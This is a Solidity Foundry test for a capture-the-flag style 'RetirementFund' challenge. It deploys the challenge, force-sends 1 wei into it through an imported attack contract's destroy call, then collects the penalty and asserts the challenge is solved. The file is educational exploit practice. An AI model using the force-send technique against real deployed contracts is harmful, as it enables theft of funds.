// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { RetirementFundChallenge } from "../src/challenges/12_RetirementFund/RetirementFundChallenge.sol";
import { RetirementFundChallengeFactory } from "../src/challenges/12_RetirementFund/RetirementFundChallengeFactory.sol";
import { RetirementFundAttack } from "../src/attacks/RetirementFundAttack.sol";

contract RetirementFundTest is Test {
    RetirementFundChallenge public challenge;

    function setUp() public {
        RetirementFundChallengeFactory factory = new RetirementFundChallengeFactory();
        challenge = factory.createChallenge{ value: 1 ether }(address(this));
    }

    function test() public {
        RetirementFundAttack attacker = new RetirementFundAttack();
        attacker.destroy{ value: 1 }(payable(address(challenge)));
        challenge.collectPenalty();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
